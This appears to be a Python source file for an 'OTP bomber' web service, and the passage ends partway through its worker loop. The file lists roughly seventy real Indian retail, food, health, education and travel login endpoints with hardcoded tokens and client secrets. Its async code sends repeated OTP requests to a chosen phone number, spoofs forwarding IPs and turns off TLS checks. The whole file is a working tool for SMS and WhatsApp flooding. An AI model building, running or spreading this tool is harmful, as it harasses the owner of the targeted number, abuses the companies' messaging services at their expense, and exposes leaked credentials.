#!/usr/bin/env python3
"""
🔥 ULTIMATE OTP BOMBER API v6.0 — FULL FIXED
"""

import asyncio, time, random, json
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

try:
    import uvloop
    uvloop.install()
    print("✅ uvloop enabled")
except ImportError:
    print("⚠️  uvloop not installed")

app = FastAPI(title="ULTIMATE OTP BOMBER v6.0")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# ═══════════════════════════════════════════════════════════
# ⚙️ SETTINGS — FAST + STABLE
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT  = 2000
BATCH_CHUNK     = 500
REQUEST_TIMEOUT = 6
CONNECT_TIMEOUT = 3

OTP_KEYWORDS = ("success", "sent", "otp", "verified", "delivered", "true", "ok", "message")

_running_jobs = {}
_stop_numbers = set()
_global_stats = defaultdict(lambda: {"total":0,"http_ok":0,"otp_ok":0,"failed":0,"start":0})

_IP_POOL = ["103.159.84.134","49.36.180.11","157.32.75.10","182.70.117.55",
            "106.51.85.20","43.241.145.10","202.83.16.5","115.113.20.10"]

# ═══════════════════════════════════════════════════════════
# 📋 ALL APIS
# ═══════════════════════════════════════════════════════════
ULTIMATE_APIS = [
    # ═══════ NEW APIS ═══════
    {"name": "carinfo", "url": lambda p: f"https://www.carinfo.app/core-api/car/api/v3/web/auth/user/generateOtp?mobile={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/151.0 Mobile Safari/537.36", "Accept": "application/json", "Origin": "https://www.carinfo.app", "Referer": "https://www.carinfo.app/"}, "data": None},
    {"name": "policybazaar", "url": "https://myaccount.policybazaar.com/myacc/login/sendOtpV3", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/151.0 Mobile Safari/537.36", "Content-Type": "application/json", "x-ismobile": "true", "x-client-source": "PBHOME_MYACC", "origin": "https://www.policybazaar.com", "referer": "https://www.policybazaar.com/"}, "data": lambda p: f'{{"SMSType":1,"CountryCode":"91","Mobile":"{p}","OTPLogin":true,"source":"MYACC","isCustReg":true,"requestReason":"OTPLogin"}}'},
    {"name": "parkplus", "url": "https://user-service.parkplus.io/api/v1/user/b2c/otp/send/", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/151.0 Mobile Safari/537.36", "Content-Type": "application/json", "app-name": "Park+ PWA", "new-device-id": "75112be82bf6deb427e4a5e26b6cf58b", "package-name": "web.pwa", "client-id": "8186c1be-660f-428c-93a7-6480c2d8af66", "client-secret": "hjjh0uw8c3j7vw5jgba8", "device-id": "75112be82bf6deb427e4a5e26b6cf58b", "platform": "web", "origin": "https://parkplus.io", "referer": "https://parkplus.io/"}, "data": lambda p: f'{{"phone_number":"{p}"}}'},
    {"name": "vahandetails", "url": "https://restapi.vahandetails.com/api/auth/send-otp", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Origin": "https://vahandetails.com", "Referer": "https://vahandetails.com/"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "pbwheels", "url": "https://accounts.pbwheels.com/api/auth/challenge?mode=1", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "origin": "https://www.pbwheels.com", "referer": "https://www.pbwheels.com/"}, "data": lambda p: f'{{"id":"{p}"}}'},
    {"name": "themotorpedia", "url": "https://inventory-service.themotorpedia.com/api/v1/customer/login", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "origin": "https://themotorpedia.com", "referer": "https://themotorpedia.com/"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "cars24", "url": "https://auth.cars24.com/oauth2/otp/generate", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "x-device-id": "0c0cad0b-424b-4234-b822-e28aeec10342", "x-client-id": "client_GigJNyUs3BDhksqFgNeT_w", "origin": "https://www.cars24.com", "referer": "https://www.cars24.com/"}, "data": lambda p: f'{{"flow_token":"FoBd3Fs1QV0K-yckSArbr2gWp2b2rUX-UugCI-pRJOTfpEPlGQAU0eD0Ixo73dLSuDC6bxEsL4Oe-SUBcUmtJ6MIgp22BZ4AHzgEvl6aBN0cfIoKpirZgA274BOaI0nOC2vmk3EsMIXpXlmRgQTXGbIpfJB5d9YydH3Suo49NauZayEHXJ19LaAAeULUS7NhiPYUyUpKPv61AN3KVjm3OXWmRqmT9UUlpghjcagGHQlNEqrATTN5jILfxyk5twKb7UJ40FPWtTmErfBddeZWi0Y2Nn9bKxuLYYdwRf7ZWMUhtYz2aMMj3xFuLY-g9yKfUNp8agIS_CRpveq2YbIVAztDhnpDrenFJPadzgPI2U-5HGBEq3N_bqHFcWfCuzjBm6z-JrVeXSU-9rltdZ3Gve_YxflVEfLsTonynLpxhtUu6JBxa15jLR4JhOt3l6isLl2oH4v3gNb-bYOTwgOsTJkLYJT77_hgOR8WJaHDl8_qLlfTpImYvOWuDTlQIDl43DRXdPXrvErkybuwAC6dlsmOWIjGHqDvtqbD58yBzaSoSWz1CfB15TknGR_wv0tEA1mL2g21d_DWtZq-s1pcIKwldoQC6BeFLndkTSXb8tRmpAxQrdQjFIZejjLCz7U4W49fwFU2XjCYrGNpW6W87QoEiGxtEvetvC6fy9Yl4fGZWTemg-JGgsMv2vLpyIPkuK1NldY7-KP0mqWjQvA-gLPVhQX8J87ISvoBdfIHG7xNUCQ0U2ogr1pfvMXH6z-Vj_X96bNlsXo9QOLmhyyaJ5SLmqTdpMOweUm3b0cjnQ5SPKbDT21cAYVJDej3rVVl_b2EzOeCEfzzLRePzzIEpEXkrVISBXLdRhHHZ5T1lahzTG3Jv_8nJld2B_OSSPxIrQyEpYV7V0fvveSpltwtf0SRLS1W9LyxLa51Txa-PpiCbzmmQVH0u71EDV-n4eRZRW3LNWv-GJnIbmcOmyYNfH4xse3r76Zahg-mOlh_kZC20wWs8dSIMdP1RYCRA6fkqhsUyMkOKIOeoa41TvbAI7I2o03oXBkptVIdLajGaYOiKWgXuAmZRUG5Cu_pvXfY687OvpW_zMT92e1Z_byRbDFIR_qc1C3LSuuS6AWveHRMOqWJIwovenyvLxlnUUyGPo-UYweR4dhAe3eiiZcl4TFG8oruE3lLg23Azf3hj9L1t3DaHcsZC0vn-x5VhWvez5fxZk5cI5NyJFKr--lM8Z--B48b-veOn6kmUHe7t-Y6WXA3C7HgOtbUXk-pH0P6q5eHrNIm--qyIjMpUjvI-9HKU7ZiYVcnIRQ_oJz11m7VsBI7HQHIvYe9FbLWmlKPHiuIRavpCm98Cpkir1V4LCn8cn5EavzbXNBR053sMddKS2cVco_3Tr9O","method_id":"PHONE_OTP","identifier":"+91{p}"}}'},
    {"name": "spinny", "url": "https://api.spinny.com/api/c/user/otp-request/v6/", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "platform": "mweb_android", "origin": "https://www.spinny.com", "referer": "https://www.spinny.com/"}, "data": lambda p: f'{{"contact_number":"{p}","whatsapp":false,"code_len":4,"g-recaptcha-response":"","g-recaptcha-version":"v3","expected_action":"login"}}'},

    # ═══════ E-COMMERCE ═══════
    {"name": "myntra", "url": "https://www.myntra.com/gateway/v1/auth/getotp", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "x-meta-app": "deviceId=1719ab7b-4693-4a04-8985-61f250ee1bf5;reqChannel=mweb;channel=web;", "deviceid": "1719ab7b-4693-4a04-8985-61f250ee1bf5", "x-myntraweb": "Yes", "x-requested-with": "browser", "origin": "https://www.myntra.com", "referer": "https://www.myntra.com/login"}, "data": lambda p: f'{{"phoneNumber":"{p}","signup":"ONECLICK"}}'},
    {"name": "bewakoof", "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "api-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk", "Origin": "https://www.bewakoof.com", "Referer": "https://www.bewakoof.com/"}, "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}'},
    {"name": "snapdeal", "url": "https://m.snapdeal.com/signupCompleteAjax", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json;charset=UTF-8", "Origin": "https://m.snapdeal.com", "Referer": "https://m.snapdeal.com/signin"}, "data": lambda p: f'{{"j_password":null,"j_mobilenumber":"{p}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'},
    {"name": "nykaafashion", "url": "https://www.nykaafashion.com/webscripts/api/otp/generate", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "x-csrf-token": "VhUNo81xmmF6kwoK", "origin": "https://www.nykaafashion.com", "referer": "https://www.nykaafashion.com/"}, "data": lambda p: f'{{"customer_mobile":"{p}"}}'},
    {"name": "fabindia", "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "authorization": "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI", "origin": "https://www.fabindia.com", "referer": "https://www.fabindia.com/"}, "data": lambda p: f'{{"mobileDailCode":"+91","mobileNumber":"{p}","isLogin":false,"isSignUp":false}}'},
    {"name": "shoppersstop", "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "origin": "https://www.shoppersstop.com", "referer": "https://www.shoppersstop.com/"}, "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "urbanladder", "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "authorization": "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==", "Origin": "https://www.urbanladder.com", "Referer": "https://www.urbanladder.com/auth/login"}, "data": lambda p: f'{{"mobile":"{p}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'},
    {"name": "pepperfry", "url": "https://www.pepperfry.com/api/account/auth/sentOtp", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "platform": "wap_mob", "source": "wap", "origin": "https://www.pepperfry.com", "referer": "https://www.pepperfry.com/"}, "data": lambda p: f'{{"mobile":"{p}","mobile_country":"+91","token":""}}'},
    {"name": "maxfashion", "url": "https://www.maxfashion.in/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "x-requested-with": "XMLHttpRequest", "content-type": "application/json;", "origin": "https://www.maxfashion.in", "referer": "https://www.maxfashion.in/in/en/"}, "data": lambda p: f'{{"signInMobile":"+91{p}"}}'},
    {"name": "lifestylestores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0", "x-requested-with": "XMLHttpRequest", "content-type": "application/json;", "origin": "https://www.lifestylestores.com", "referer": "https://www.lifestylestores.com/in/en/"}, "data": lambda p: f'{{"signInMobile":"+91{p}"}}'},
    {"name": "snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "snitch_secret", "Origin": "https://www.snitch.com"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.wakefit.co", "API-Secret-Key": "ycq55IbIjkLb", "API-Token": "c84d563b77441d784dce71323f69eb42"}, "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},
    {"name": "caratlane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.caratlane.com", "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},
    {"name": "cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.cossouq.com"}, "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"},
    {"name": "imaginestore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.myimaginestore.com"}, "data": lambda p: f"mobile={p}"},
    {"name": "sparindia", "url": "https://www.sparindia.com/api/get-otp", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.sparindia.com", "referer": "https://www.sparindia.com/"}, "data": lambda p: f'{{"mobile_number":"{p}","finalStore":"view_20011"}}'},

    # ═══════ FOOD / DELIVERY ═══════
    {"name": "zepto", "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "x-csrf-secret": "uD0aoNYI_ZA", "platform": "WEB", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "bigbasket", "url": "https://www.bigbasket.com/member-tdl/v3/member/otp", "method": "POST", "headers": {"Content-Type": "application/json", "x-caller": "Monster-SVC", "referring-client": "https://www.bigbasket.com", "x-channel": "BB-PWA", "origin": "https://www.bigbasket.com"}, "data": lambda p: f'{{"identifier":"{p}","referrer":"unified_login","recaptchaToken":""}}'},
    {"name": "nobroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.nobroker.in"}, "data": lambda p: f"phone={p}&countryCode=IN"},

    # ═══════ HEALTH / PHARMA ═══════
    {"name": "pharmeasy", "url": "https://pharmeasy.in/apt-api/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://pharmeasy.in", "Referer": "https://pharmeasy.in/"}, "data": lambda p: f'{{"param":"{p}"}}'},
    {"name": "netmeds", "url": "https://www.netmeds.com/api/service/application/user/authentication/v1.0/login/otp?platform=65f562c1504a59a67f529ad4", "method": "POST", "headers": {"Content-Type": "application/json", "authorization": "Bearer NjVmNTYyYzE1MDRhNTlhNjdmNTI5YWQ0Ol9VLW9oSTRJeQ==", "origin": "https://www.netmeds.com", "referer": "https://www.netmeds.com/"}, "data": lambda p: f'{{"mobile":"{p}","country_code":"91"}}'},
    {"name": "eka_care", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/4.9.3", "Device-Id": "5df83c463f0ff8ff"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},

    # ═══════ EDUCATION ═══════
    {"name": "allen", "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "29eeb510-774d-47e6-9606-19142305f562", "x-client-type": "mweb", "Origin": "https://allen.in", "Referer": "https://allen.in/"}, "data": lambda p: f'{{"country_code":"91","phone_number":"{p}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'},
    {"name": "aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763", "Origin": "https://www.aakash.ac.in", "Referer": "https://www.aakash.ac.in/"}, "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'},
    {"name": "penpencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "wellacademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://wellacademy.in"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {"User-Agent": "okhttp/3.9.1"}, "data": None},

    # ═══════ ENTERTAINMENT ═══════
    {"name": "bookmyshow", "url": "https://in.bookmyshow.com/api/members/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "x-app-code": "WEBV2", "x-region-slug": "mumbai", "x-platform-code": "WEBV2", "x-region-code": "MUMBAI", "Origin": "https://in.bookmyshow.com", "Referer": "https://in.bookmyshow.com/"}, "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'},
    {"name": "hotstar", "url": "https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration", "method": "POST", "headers": {"Content-Type": "application/json", "x-hs-platform": "mweb", "x-country-code": "in", "origin": "https://www.hotstar.com", "referer": "https://www.hotstar.com/"}, "data": lambda p: f'{{"body":{{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","initiate_by":0,"recaptcha_token":"","phone_number":"{p}"}}}}'},
    {"name": "hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.hungama.com", "identifier": "home", "country_code": "IN"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","templateCode":1}}'},
    {"name": "shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "dailyhunt", "url": "https://dailyhunt.in/api/pwa", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://dailyhunt.in", "Referer": "https://dailyhunt.in/"}, "data": lambda p: f'{{"method":"POST","body":{{"mobileNo":"91-{p}"}},"url":"http://dh-ugc-users.dailyhunt.in//api/v1/internal/pwa/accounts/generate/otp"}}'},

    # ═══════ TRAVEL ═══════
    {"name": "cordelia", "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.cordeliacruises.com", "Referer": "https://www.cordeliacruises.com/"}, "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","website":"https://www.cordeliacruises.com/login","pageCode":"login"}}'},
    {"name": "olx", "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN", "method": "POST", "headers": {"Content-Type": "application/json", "x-panamera-client-id": "web-mobile", "origin": "https://www.olx.in", "referer": "https://www.olx.in/en-in"}, "data": lambda p: f'{{"grantType":"phone","phone":"+91{p}","language":"en-IN"}}'},

    # ═══════ MISC ═══════
    {"name": "eurekaforbes", "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}"}}'},
    {"name": "tatadigital", "url": "https://api.tatadigital.com/api/v3/sso/check-phone", "method": "POST", "headers": {"Content-Type": "application/json", "client_id": "TCP-WEB-APP", "client_secret": "6fe27bd7-658d-4d28-ab66-a71da9637529", "origin": "https://www.tataneu.com", "referer": "https://www.tataneu.com/"}, "data": lambda p: f'{{"countryCode":"91","phone":"{p}","referralCode":"","sendOtp":true}}'},
    {"name": "croma", "url": "https://api.tatadigital.com/api/v2/sso/check-phone-croma", "method": "POST", "headers": {"Content-Type": "application/json", "client_id": "CROMA-WEB-APP", "origin": "https://www.croma.com", "referer": "https://www.croma.com/"}, "data": lambda p: f'{{"countryCode":"91","phone":"{p}"}}'},
    {"name": "gokwik_v3", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-version": "20260122163136947", "gk-signature": "292114", "gk-udf-1": "684", "gk-request-id": "556fc4c5-9562-46fe-ae1d-7148e3299005", "gk-merchant-id": "19g6illukf2pz", "origin": "https://pdp.gokwik.co", "referer": "https://pdp.gokwik.co/"}, "data": lambda p: f'{{"phone":"{p}","country":"IN"}}'},
    {"name": "mamaearth", "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-request-id": "51c1169f-3c41-4b75-ac29-47e1e3b9d25d", "gk-merchant-id": "12wyqc26spoknx0kv7t", "origin": "https://mamaearth.in", "referer": "https://mamaearth.in/"}, "data": lambda p: f'{{"phone":"{p}","country":"in","country_code":"+91"}}'},
    {"name": "lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a", "Origin": "https://www.lenskart.com", "Referer": "https://www.lenskart.com/"}, "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "gopinkcabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "kpnfresh", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"Content-Type": "application/json", "x-channel-id": "WEB", "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "bikefixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json", "client": "app", "User-Agent": "Dart/3.6"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "stratzy_sms", "url": "https://stratzy.in/api/web/auth/sendPhoneOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in", "Referer": "https://stratzy.in/login"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "stratzy_wa", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Dalvik/2.1.0"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "merucab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9", "User-Agent": "okhttp/4.9.0"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "beepkart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.beepkart.com"}, "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false}}'},
    {"name": "lendingplate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://lendingplate.com"}, "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"},
    {"name": "dayco", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://ekyc.daycoindia.com"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "shiprocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://app.shiprocket.in"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "jockey_sms", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "jockey_wa", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "newme", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "Caller": "web_app", "Origin": "https://newme.asia"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "rappi", "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json", "Deviceid": "5df83c463f0ff8ff"}, "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'},
    {"name": "foxy", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be", "Origin": "https://www.foxy.in"}, "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'},
    {"name": "smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://smytten.com"}, "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","device_platform":"web","phone":"{p}","email":"test@test.com"}}'},
    {"name": "justdial", "url": "https://www.justdial.com/api/india_api_write/20march2020/sendvcode.php?wap=2&resend=0&t_and_c=1&source=2&version=6.4&enc=1&env=p", "method": "POST", "headers": {"Content-Type": "application/json", "origin": "https://www.justdial.com", "referer": "https://www.justdial.com/"}, "data": lambda p: f'{{"mobile":"{p}","fname":""}}'},
]

# Remove duplicates
_seen, CLEAN = set(), []
for api in ULTIMATE_APIS:
    if api["name"] not in _seen:
        _seen.add(api["name"])
        CLEAN.append(api)
ULTIMATE_APIS = CLEAN
print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs")


# ═══════════════════════════════════════════════════════════
# 💣 FIRE ONE
# ═══════════════════════════════════════════════════════════
async def fire_one(session, api, phone, stats):
    try:
        headers = dict(api["headers"])
        ip = random.choice(_IP_POOL)
        headers["X-Forwarded-For"] = ip
        headers["X-Real-IP"] = ip

        url = api["url"](phone) if callable(api["url"]) else api["url"]
        data = api["data"](phone) if api.get("data") else None

        if api["method"].upper() == "POST":
            async with session.post(url, headers=headers, data=data, ssl=False) as r:
                status = r.status
                try: text = await r.text()
                except: text = ""
        else:
            async with session.get(url, headers=headers, ssl=False) as r:
                status = r.status
                try: text = await r.text()
                except: text = ""

        stats["total"] += 1
        if status < 400:
            stats["http_ok"] += 1
            low = text[:500].lower()
            if any(k in low for k in OTP_KEYWORDS):
                stats["otp_ok"] += 1
                print(f"  ✅ [{api['name']}] OTP SENT ({status})")
            else:
                print(f"  🟡 [{api['name']}] HTTP {status}")
        else:
            stats["failed"] += 1
            print(f"  ❌ [{api['name']}] HTTP {status}")
    except asyncio.TimeoutError:
        stats["total"] += 1; stats["failed"] += 1
        print(f"  ⏱️  [{api['name']}] TIMEOUT")
    except Exception as e:
        stats["total"] += 1; stats["failed"] += 1
        print(f"  ⚠️  [{api['name']}] {type(e).__name__}")


# ═══════════════════════════════════════════════════════════
# 💣 WORKER
# ═══════════════════════════════════════════════════════════
async def bomb_worker(job_id, phone, count):
    _stop_numbers.discard(phone)

    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, limit_per_host=100, ttl_dns_cache=300, ssl=False)
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
    headers_base = {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate"}

    stats = _global_stats[phone]
    stats["total"] = stats["http_ok"] = stats["otp_ok"] = stats["failed"] = 0
    stats["start"] = time.time()

    print(f"\n{'='*70}\n[{job_id}] 🔥 STARTED | +91{phone} | cycles={count}\n[{job_id}] {len(ULTIMATE_APIS)} APIs\n{'='*70}")

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers_base) as session:
            for cycle in range(count):
                if phone in _stop_numbers:
                    print(f"[{job_id}] 🛑 Stopped at cycle {cycle+1}")
                    break

                tasks = [fire_one(session, api, phone, stats) for api in ULTIMATE_APIS]

                for i in range(0, len(tasks), BATCH_CHUNK):
                    await asyncio.gather(*tasks[i:i+BATCH_CHUNK], return_exceptions=True)

                elapsed = time.time() - stats["start"]
